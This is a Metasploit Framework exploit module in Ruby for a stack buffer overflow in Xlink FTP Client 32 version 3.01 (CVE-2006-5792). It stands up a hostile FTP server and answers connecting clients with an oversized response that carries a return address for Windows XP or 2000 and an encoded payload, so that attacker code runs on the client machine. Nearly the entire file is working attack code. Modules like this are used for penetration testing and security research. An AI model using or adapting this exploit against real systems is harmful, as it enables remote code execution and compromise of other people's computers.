##
# $Id: xlink_client.rb 10998 2010-11-11 22:43:22Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::TcpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Xlink FTP Client Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Xlink FTP Client 32
				Version 3.01 that comes bundled with Omni-NFS Enterprise 5.2.
				When a overly long FTP server response is recieved by a client,
				arbitrary code may be executed.
			},
			'Author' 	 => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10998 $',
			'References'     =>
				[
					[ 'CVE', '2006-5792' ],
					[ 'OSVDB', '33969' ],
					[ 'URL', 'http://www.metasploit.com/' ],
					[ 'URL', 'http://www.xlink.com' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 550,
					'BadChars' => "\x00\x0a\x0d\().,",
					'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP Pro SP3 English', { 'Ret' => 0x7d054897 } ],
					[ 'Windows 2000 SP4 English', 	{ 'Ret' => 0x7ce02a2d } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Oct 3 2009',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptPort.new('SRVPORT', [ true, "The FTP daemon port to listen on", 21 ]),
			], self.class)
	end

	def on_client_connect(client)

		return if ((p = regenerate_payload(client)) == nil)

		sploit =  rand_text_alpha_upper(260) + [target.ret].pack('V') + payload.encoded
		sploit << rand_text_alpha_upper(1024 - payload.encoded.length) + "\r\n"

		print_status("Sending #{self.name}...")
		client.put(sploit)

		handler(client)
		service.close_client(client)

	end
end
